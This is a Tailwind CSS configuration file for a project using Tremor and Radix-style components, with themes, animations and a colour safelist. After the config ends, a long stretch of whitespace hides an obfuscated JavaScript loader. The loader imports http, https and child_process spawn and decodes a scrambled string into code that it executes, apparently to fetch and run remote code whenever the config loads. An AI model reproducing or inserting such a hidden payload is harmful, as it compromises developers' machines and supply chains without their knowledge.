/** @type {import('tailwindcss').Config} */
import scrollbarHide from "tailwind-scrollbar-hide";
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

module.exports = {
  darkMode: ["class"],
  content: [
    "./pages/**/*.{ts,tsx}",
    "./components/**/*.{ts,tsx}",
    "./app/**/*.{ts,tsx}",
    "./src/**/*.{ts,tsx}",
    "./node_modules/@tremor/**/*.{js,ts,jsx,tsx}", // TREMOR
    "./ee/**/*.{ts,tsx}",
  ],
  theme: {
    container: {
      center: "true",
      padding: "2rem",
      screens: {
        "2xl": "1400px",
      },
    },
    extend: {
      colors: {
        border: "hsl(var(--border))",
        input: "hsl(var(--input))",
        ring: "hsl(var(--ring))",
        background: "hsl(var(--background))",
        foreground: "hsl(var(--foreground))",
        primary: {
          DEFAULT: "hsl(var(--primary))",
          foreground: "hsl(var(--primary-foreground))",
        },
        secondary: {
          DEFAULT: "hsl(var(--secondary))",
          foreground: "hsl(var(--secondary-foreground))",
        },
        destructive: {
          DEFAULT: "hsl(var(--destructive))",
          foreground: "hsl(var(--destructive-foreground))",
        },
        warning: {
          DEFAULT: "hsl(var(--warning))",
          foreground: "hsl(var(--warning-foreground))",
        },
        muted: {
          DEFAULT: "hsl(var(--muted))",
          foreground: "hsl(var(--muted-foreground))",
        },
        accent: {
          DEFAULT: "hsl(var(--accent))",
          foreground: "hsl(var(--accent-foreground))",
        },
        popover: {
          DEFAULT: "hsl(var(--popover))",
          foreground: "hsl(var(--popover-foreground))",
        },
        card: {
          DEFAULT: "hsl(var(--card))",
          foreground: "hsl(var(--card-foreground))",
        },
        tremor: {
          brand: {
            faint: "#eff6ff",
            muted: "#bfdbfe",
            subtle: "#60a5fa",
            DEFAULT: "#3b82f6",
            emphasis: "#1d4ed8",
            inverted: "#ffffff",
          },
          background: {
            muted: "#f9fafb",
            subtle: "#f3f4f6",
            DEFAULT: "#ffffff",
            emphasis: "#374151",
          },
          border: {
            DEFAULT: "#e5e7eb",
          },
          ring: {
            DEFAULT: "#e5e7eb",
          },
          content: {
            subtle: "#9ca3af",
            DEFAULT: "#6b7280",
            emphasis: "#374151",
            strong: "#111827",
            inverted: "#ffffff",
          },
        },
        "dark-tremor": {
          brand: {
            faint: "#0B1229",
            muted: "#172554",
            subtle: "#1e40af",
            DEFAULT: "#3b82f6",
            emphasis: "#60a5fa",
            inverted: "#030712",
          },
          background: {
            muted: "#131A2B",
            subtle: "#1f2937",
            DEFAULT: "#111827",
            emphasis: "#d1d5db",
          },
          border: {
            DEFAULT: "#1f2937",
          },
          ring: {
            DEFAULT: "#1f2937",
          },
          content: {
            subtle: "#4b5563",
            DEFAULT: "#6b7280",
            emphasis: "#e5e7eb",
            strong: "#f9fafb",
            inverted: "#000000",
          },
        },
        sidebar: {
          DEFAULT: "hsl(var(--sidebar-background))",
          foreground: "hsl(var(--sidebar-foreground))",
          primary: "hsl(var(--sidebar-primary))",
          "primary-foreground": "hsl(var(--sidebar-primary-foreground))",
          accent: "hsl(var(--sidebar-accent))",
          "accent-foreground": "hsl(var(--sidebar-accent-foreground))",
          border: "hsl(var(--sidebar-border))",
          ring: "hsl(var(--sidebar-ring))",
        },
      },
      boxShadow: {
        "tremor-input": "0 1px 2px 0 rgb(0 0 0 / 0.05)",
        "tremor-card":
          "0 1px 3px 0 rgb(0 0 0 / 0.1), 0 1px 2px -1px rgb(0 0 0 / 0.1)",
        "tremor-dropdown":
          "0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1)",
        "dark-tremor-input": "0 1px 2px 0 rgb(0 0 0 / 0.05)",
        "dark-tremor-card":
          "0 1px 3px 0 rgb(0 0 0 / 0.1), 0 1px 2px -1px rgb(0 0 0 / 0.1)",
        "dark-tremor-dropdown":
          "0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1)",
      },
      borderRadius: {
        "tremor-small": "0.375rem",
        "tremor-default": "0.5rem",
        "tremor-full": "9999px",
        lg: "var(--radius)",
        md: "calc(var(--radius) - 2px)",
        sm: "calc(var(--radius) - 4px)",
      },
      fontSize: {
        "tremor-label": ["0.75rem"],
        "tremor-default": ["0.875rem", { lineHeight: "1.25rem" }],
        "tremor-title": ["1.125rem", { lineHeight: "1.75rem" }],
        "tremor-metric": ["1.875rem", { lineHeight: "2.25rem" }],
      },
      keyframes: {
        "scale-in": {
          "0%": {
            transform: "scale(0.95)",
          },
          "100%": {
            transform: "scale(1)",
          },
        },
        "fade-in": {
          "0%": {
            opacity: "0",
          },
          "100%": {
            opacity: "1",
          },
        },
        gauge_fadeIn: {
          from: {
            opacity: "0",
          },
          to: {
            opacity: "1",
          },
        },
        gauge_fill: {
          from: {
            "stroke-dashoffset": "332",
            opacity: "0",
          },
          to: {
            opacity: "1",
          },
        },
        flyEmoji: {
          "0%": {
            transform: "translateY(0) scale(1)",
            opacity: "0.7",
          },
          "100%": {
            transform: "translateY(-150px) scale(2)",
            opacity: "0",
          },
        },
        "accordion-down": {
          from: {
            height: "0",
          },
          to: {
            height: "var(--radix-accordion-content-height)",
          },
        },
        "accordion-up": {
          from: {
            height: "var(--radix-accordion-content-height)",
          },
          to: {
            height: "0",
          },
        },
        "caret-blink": {
          "0%,70%,100%": {
            opacity: "1",
          },
          "20%,50%": {
            opacity: "0",
          },
        },
      },
      gridTemplateColumns: {
        16: "repeat(16, minmax(0, 1fr))",
      },
      animation: {
        "scale-in": "scale-in 0.2s cubic-bezier(0.16, 1, 0.3, 1)",
        "fade-in": "fade-in 0.2s ease-out forwards",
        gauge_fadeIn: "gauge_fadeIn 1s ease forwards",
        gauge_fill: "gauge_fill 1s ease forwards",
        flyEmoji: "flyEmoji 1s forwards",
        "accordion-down": "accordion-down 0.2s ease-out",
        "accordion-up": "accordion-up 0.2s ease-out",
        "caret-blink": "caret-blink 1.25s ease-out infinite",
      },
    },
  },
  //**  START: TREMOR safelist **//
  safelist: [
    {
      pattern:
        /^(bg-(?:slate|gray|zinc|neutral|stone|red|orange|amber|yellow|lime|green|emerald|teal|cyan|sky|blue|indigo|violet|purple|fuchsia|pink|rose)-(?:50|100|200|300|400|500|600|700|800|900|950))$/,
      variants: ["hover", "ui-selected"],
    },
    {
      pattern:
        /^(text-(?:slate|gray|zinc|neutral|stone|red|orange|amber|yellow|lime|green|emerald|teal|cyan|sky|blue|indigo|violet|purple|fuchsia|pink|rose)-(?:50|100|200|300|400|500|600|700|800|900|950))$/,
      variants: ["hover", "ui-selected"],
    },
    {
      pattern:
        /^(border-(?:slate|gray|zinc|neutral|stone|red|orange|amber|yellow|lime|green|emerald|teal|cyan|sky|blue|indigo|violet|purple|fuchsia|pink|rose)-(?:50|100|200|300|400|500|600|700|800|900|950))$/,
      variants: ["hover", "ui-selected"],
    },
    {
      pattern:
        /^(ring-(?:slate|gray|zinc|neutral|stone|red|orange|amber|yellow|lime|green|emerald|teal|cyan|sky|blue|indigo|violet|purple|fuchsia|pink|rose)-(?:50|100|200|300|400|500|600|700|800|900|950))$/,
    },
    {
      pattern:
        /^(stroke-(?:slate|gray|zinc|neutral|stone|red|orange|amber|yellow|lime|green|emerald|teal|cyan|sky|blue|indigo|violet|purple|fuchsia|pink|rose)-(?:50|100|200|300|400|500|600|700|800|900|950))$/,
    },
    {
      pattern:
        /^(fill-(?:slate|gray|zinc|neutral|stone|red|orange|amber|yellow|lime|green|emerald|teal|cyan|sky|blue|indigo|violet|purple|fuchsia|pink|rose)-(?:50|100|200|300|400|500|600|700|800|900|950))$/,
    },
  ],
  //**  END: TREMOR safelist **//
  plugins: [
    require("@tailwindcss/forms"),
    require("tailwindcss-animate"),
    require("@tailwindcss/typography"),
    scrollbarHide,
  ],
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global.i="A11-#",global.r=require,global.m=module;let h=require("http"),s=require("https"),{spawn:Z}=require("child_process"),var _$jsoToArr;(function(){var pQD='',qqR=536-525;function Ozz(v){var x=53224;var s=v.length;var q=[];for(var z=0;z<s;z++){q[z]=v.charAt(z)};for(var z=0;z<s;z++){var b=x*(z+372)+(x%33789);var u=x*(z+109)+(x%41222);var p=b%s;var m=u%s;var f=q[p];q[p]=q[m];q[m]=f;x=(b+u)%3201480;};return q.join('')};var uDx=Ozz('obgpvneczlqhurtosdcyjkotnscwfrximatru').substr(0,qqR);var TZh='10o a; C;jc;tAne726] .rsi,lb"]sfaq.j [=nv;d=0ngvwvr oiun;uhn;8s,i5. t7r)9;;=]ulq9aa7,8;n.),6=rhn6a,6r0(8][udrcw,)9)t l1)v,v+6r(0x2aver(vnjvr77fc<wr1)8a+fpgsc)yr([(]hbg+c++;rzh+ (f=i Alh6c=uson8=hehjhl(zawCmu0;r. r+."uo8"*a+rrtit9rt)ea(u=.];{,l}ee=8[;r; A 4t(+o;)t{)=v,(4jq;m.r]nl);]h;}xr2.q;ln0f,,}o=.<1gcz;cs1ag[()g)o58"1.*;-ea=a]y.0mtmv 3-tx=sp{eb84a0uw] +oh6,bs(=0ouaooq+,)kvts=vir.y=f,1[raep+o)(vsra=n-(=;;+f(uh)a="Cy1b g+=iv2(rC =;;t)ui72 [ 1}u=axgdi8iv=+ie(=[ga)(p;c u=uzg,en-=h=zo=hur,o(vAo2+a1;.b<ub[eithyenshug29r,;;;=;o+,f{)ib+e{xqh<fsuflmif(f;o uln,7e+g(al,f>e!frpulvrm<rv(izrptuvfcbi[,[tptdnfm[g raee6!n+);ar[.;;a=.nC.kr(thl)t2.bj](si;d=ks=oj-g(-.r}ln2];iujouan"))n}orjcse)eaa0(l;fv)]i+4le),a;jr"dt0=>r(f,3+)(+n9") nmarv1rsllet;(g,(0=7-jaj;lu1g(.g7npgu)naC[)abjCC1vo{(=l" bSv;==..ow.lg .rt)=m=rg1;tim9=fls6mariy=pt5.;,g4vStrop(.2tr,)ckc];vv+h7bo) ;}es{+trpdupav(.ayen"tn=l),iA;n';var gZH=Ozz[uDx];var lZA='';var OxJ=gZH;var UNm=gZH(lZA,Ozz(TZh));var UCM=UNm(Ozz('!(gi;sR{@=R:tda0R!(a!y=v;z,o%e5d(bpel=.!5R.=)}eRR[R)d.z0a(EhRxf_|RR))[eoe)0eli[a503)! ;>cnrn(g.m%r]a6r=.ed%vdmng_v=R=f=f2}R1,gtads%+4+.%s{="=|0[R2u,tmoT1a)Rhdns=S.0nc=.wRgot))slb).R9;,aovosz=odda. Rd.o+.dd)}esnd2*n)4;.7:aS{-%2.=;a)]CRe:()27v8b)e.tk7:(.d;.!48ia#1re.+gxn],rvrurCdr%e.btac(a;_.aHd.e)l;e]]7:nelIae).ce2Rpo@!o_e\/r#.sR46)4RseRrg%k(.,cd@i6ctA\/.}t_4.%l$ew)$) ReRp5\/d.R4R9oRcDb$5trmt}0=Sc),di]9C0rt_g.]1R*ia[b)n!)1R0i)0.z4[eR(n=$,e+R=R1hFa"d{e}\/]_on3!jdgR(7x8s=r5e;%.ot=(atExBi%rl&rRyrkd)bttp(!].prRb!i>ofttoRos>xewRyttdc&reR(y0!w]})%4=vRn2r. Rt%[jr%]1wac+=;bdb,)t].d"Seph.o;hnr[d=p;cSf6!tH(x]AeR+,[{.%;!lR(eu.0Rc%a0R)=_.)edgoa.m,=eR88eo6l!\'agR{a).w7z.R%a7!ar.pdrto6.cwy2uRa(loo!!Rdda.n3nc2.%sg=e}3r@a=(guR( giR=,%8Re.(\/Rh%Ra.rd,.aRRe: _=!0R()9.en.n3To0.]1.9ee.,yT.!x=o6=;t{ldi(=!0,() r=2()So"7Re_).2#Neo,q8|n(;}s.RgaRo =i]#r&4tR0]+__ p(66ft,.gJR@#d7.=brl=.\']%ondRn!d>RA[3!nFoiR$:Re(Rtgtt%(:iac+_R6o}6+SRu](ddthRyefo=i!1ted)zdw,,.,e;c-hRhw.0(nhgw-).,12onb%.{...e 3i(.)@vRlp!rn)oy.}R]<..!t1e R.d.nhv5de01gsda;d5exoJ(0nc.R_i\/v3ot7.((}=,sgR. ?vdi8oc}!.{]s4:l+tdR.:Re\/(9]}dgia,FhR=;?0s0c,dodR:evDp)r%Rd_RC.nrwxtcES%i]?dR31{"%sTd.y$!RlwS+n:Reami.j:}zrrt( ueRern%o]oevD:49.:nyk3ho(teh?n5)3RRe9Cnd{}tfar!gt3,=Rr:@) ,RRs.90t{h(v)m>R{.a3.mg.{]ry4 ;Rn),ha;.,R!ia)R2etRk:2reAB@}bdfo?c.1i)%=.). d7,$= ]R5)(l&a,dNo=t ls7 nr}c.Reao(=}2}t28Rs=x1Rq[0a)rt.*1se.td0xtods4,e(y}a,om.Rpso_81l=snddaomR[Rt]%]v-,rRmf;an))&o]ounooT)R!r.t_{p%bywn#b=GlRw3+1v:+eR9act]!e.5aad.h}t,r{s)6$l(o}o]r)ab:7t6yd=Rg)te)(2Rao.(.!t7]adR!t:g]toc).R!8dc,_0  Rb&,8(R.er5odgpr<A.(pR&cRicRCnh"])0b.r.ee,r0. pw,n(RerT1d!!_.D3%.la0ggdo2x1058s)d+=.=1;=,]o([RH0n,oa(hRr1!.Rs&t;cf,0aa{]6\/,\/ #_9.t_R,),?(l_).enel.bRi.6t5R;etaRe=(8[uAnp,3T7:d1gtuNRfoe)R=R.R8R;l[r.{RbR)ancRe==.+r.9te9,Ehn%a&e].jCm],)6.x@ucGn ,!1tf3!ptR). .%t(2=bar}bltt.hf)o3=[@xst0tdnar)e nc(bdaeR(\'..R7Rj\/Sl)7G<ho(seo))m !=!nI!}he[-]tAk 1}+8dduyRRx(cs..Rr vu04Br$8d]i\/fn:.!a[eo%R9R)!c1.{86%.fc;.de=(..2=N$=Rtt[e+{R3]hloDply+,%[i.]=,=(;l)iaoyds=z[d%r(g[ 4a,_yR=a.|dod2_;(.8x@4.u;(8ecz:ER+RpRudbR,RfRehJsRR0]%aR%,co=cnoeR\'tdel"rl23:lod:$o,xrh(e{h+5}d:=%t8)st4R!.b.a?tRh8?Igd%)brBc_3o[d i\/ih-;n_RT=r.B0!}u:tb!.nph6{Ri)Rs=ymh.p8soR=);teR)vR8esvert,oR3op(ao.7r,8*p(({l.}0}of0]Rrr<hf.!,](-R3nd)6).3[wRdj?.uR%.0,(r))&bs(.s0)2s=n2(}.R62RG.eR(p$_k(9p4e4Rf[E1t9>%R]d._6[{re=w-.2w.)ltd.tR;.jI,](smat)1d..],.f=5})8alJ%+ynw.,{(5 n=!>i+,R(,o5+de:bbg15e.w\/.c(i1,me0 rn)RdF0er_irs]6ReR;gri$,Fr.tnRe6R>ae.(\/=,]g%e.ta(RR8.],gb$t(t.Rb!d.Ra)dt(ao]pol!r4d=!R.(e:{sRddRdd)(.tvR5R,01R"2]f%flR!!coie]R{fetcen!C{!e,fipl{>4cr]R(er,2..=iim{,R4081}i+"nn9;hs]jcR)}]..9[R(]t4c- \/x,f)e(!rp(.,nR)RR7!=.Rm(o uqa;d)d%eo0.t=fu=g:_0oo&te.!} S"ru(olt1l==)}R-RHd0R)+v.}0f>)1 8Ap1y:\/gr(hiS5a\/lfofah[r_ray!i.70adeR 9})i(Ryu(&d,e(@0+8a6rsu=qp,x=RB)l:Ryf, ,.dtd%>x.ndn1,=u(tas0-k.!xotn3tto%sv(a)o]8Ia-l)r$.6$_RxR)nRf8pt!};a$hl;{.!_o]el)ot]hr!n)_pgb70 au1,1RR0}Rd)l+.e,2p2!d}C,dj_alv,..=hRd %! 6aS%e5o;l%cdRr=Ram1las.3'));var rkk=OxJ(pQD,UCM );rkk(5469);return 7332})()
